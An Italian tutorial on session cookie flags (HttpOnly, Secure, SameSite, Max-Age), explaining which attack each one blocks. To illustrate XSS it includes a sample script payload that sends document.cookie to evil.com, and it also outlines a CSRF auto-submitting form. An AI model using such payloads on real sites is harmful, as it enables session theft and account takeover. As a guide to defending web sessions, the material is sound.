# I flag dei cookie di sessione: HttpOnly, Secure, SameSite e scadenza

Un cookie di sessione (vedi la wiki sulle sessioni) è un `nome=valore` che il
browser salva e rispedisce automaticamente a ogni richiesta verso il sito. Da
solo, però, quel `nome=valore` è poco più di un post-it: chiunque lo intercetti
o riesca a leggerlo può rubare la sessione. A rendere sicuro un cookie di
sessione sono i suoi **attributi** — i flag che il server imposta nell'header
`Set-Cookie`. Ciascuno ha un compito preciso e difende da un **attacco
specifico**: capire i flag significa capire le minacce. I quattro che contano
davvero per una sessione sono `HttpOnly`, `Secure`, `SameSite` e la scadenza.

---

## `HttpOnly` — "JavaScript non può leggere questo cookie"

Il browser esegue il JavaScript del tuo frontend. Se quello script potesse
leggere il cookie, allora **qualsiasi bug che permette a un attaccante di
eseguire il proprio script nella tua pagina** (un attacco chiamato **XSS**,
cross-site scripting) potrebbe rubare il token di sessione leggendo
`document.cookie` e inviarlo al suo server. `HttpOnly` marca il cookie come
accessibile solo dal livello HTTP del browser: JavaScript non lo vede mai,
ma il browser continua a inviarlo da solo a ogni richiesta.

- **Perché conta:** trasforma una falla XSS da "l'attaccante prende il
  controllo del mio account" in "l'attaccante può pasticciare la pagina, ma
  non la mia sessione".
- **Senza:** un solo bug XSS nel frontend → il cookie di sessione è
  leggibile → furto completo dell'account. È il flag a più alto impatto.

Un tipico flusso XSS:

```
1. L'attaccante trova un punto dove l'input utente viene renderizzato come HTML (es. un commento).
2. Pubblica:  <script>fetch('https://evil.com?c='+document.cookie)</script>
3. La vittima apre la pagina → lo script gira → legge document.cookie.
4. Se il cookie NON fosse HttpOnly → il token viene esfiltrato → l'attaccante sei tu.
   Se È HttpOnly → document.cookie non restituisce nulla → il token è al sicuro.
```

## `Secure` — "invia questo cookie solo su HTTPS"

Se il cookie viaggiasse anche su HTTP in chiaro, chiunque possa osservare il
traffico di rete potrebbe leggerlo: un Wi-Fi pubblico che non controlli, un
provider, chiunque sia sulla stessa rete. `Secure` dice al browser: non inviare
mai questo cookie su una connessione insicura (HTTP).

- **Perché conta:** HTTPS crittografa l'intera richiesta, quindi il cookie è
  avvolto in quella crittografia. `Secure` garantisce che il token viaggi solo
  criptato.
- **Senza:** su un Wi-Fi pubblico, `session_token` compare in chiaro nel
  traffico — ogni dispositivo sulla rete può leggerlo e dirottare la sessione.
- **Nota:** in sviluppo locale (`http://localhost`) i browser spesso
  rilassano la regola, così il cookie funziona comunque, perché localhost è
  considerato affidabile. In produzione `Secure` è obbligatorio, ed è uno dei
  motivi per cui un'app che usa cookie di sessione deve avere HTTPS.

## `SameSite=Lax` — "invia questo cookie solo per richieste dello stesso sito"

Difende dal **CSRF** (cross-site request forgery). Il CSRF è un attacco in cui
una pagina malevola inganna *il tuo* browser perché invii una richiesta a un
sito in cui sei già loggato, cavalcando la tua sessione. Poiché il browser
*allega automaticamente* il cookie di sessione, un link o un form ben
costruito su un sito malevolo può farti compiere azioni — un bonifico, un
cambio di email — a tua insaputa.

- **Perché conta:** `SameSite=Lax` significa che il cookie *non* viene inviato
  con le richieste cross-site (richieste che provengono da un sito diverso).
  Così una pagina malevola non può portarsi dietro la tua autenticazione.
- **Senza:** un form nascosto su `evil.com` che si auto-invia a `POST /bonifici`
  includerebbe il tuo cookie di sessione → l'azione avviene come se fossi tu.

Un flusso CSRF:

```
1. Sei loggato in una app (cookie di sessione salvato).
2. Visiti evil.com, che contiene un form nascosto:
     <form action="/bonifici" method="POST"> ... </form> che si auto-invia.
3. Il browser invia quella POST *con il tuo cookie di sessione* (perché SameSite=Lax
   è assente, o la richiesta è "abbastanza same-site").
4. Il server non può dire che arriva da evil.com → esegue il bonifico.
```

## `Max-Age` — "questo cookie scade tra X secondi"

Anche un cookie "perfetto" non dovrebbe vivere per sempre. `Max-Age` (o
`Expires`) imposta una durata che dovrebbe combaciare con la scadenza della
sessione lato server. Ogni token va limitato nel tempo, così che — anche se
viene rubato — sia utilizzabile solo per una finestra ristretta.

- **Perché conta:** è l'ultima linea di difesa: se un token trapela, il danno
  è delimitato nel tempo.
- **Senza:** un cookie di sessione muore quando il browser si chiude *oppure*
  può essere impostato per persistere all'infinito. Un token rubato da un
  cookie dimenticato funziona per sempre, e le sessioni si accumulano nel
  database senza mai scadere.

## Tutti insieme

Questi flag non sono extra facoltativi: sono ciò che rende sicura una sessione
a cookie. L'header HTTP che imposta un cookie di sessione tipicamente ha
questa forma:

```
Set-Cookie: session_token=a1b2c3...; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
           └──il valore──┘ └─1──┘ └─2─┘ └────3────┘ └──────4──────┘
```

La regola pratica da ricordare: `HttpOnly` contro il furto via JavaScript,
`Secure` contro il furto in rete, `SameSite=Lax` contro le richieste
cavalcate da altri siti, e una scadenza che limita i danni di qualunque
perdita.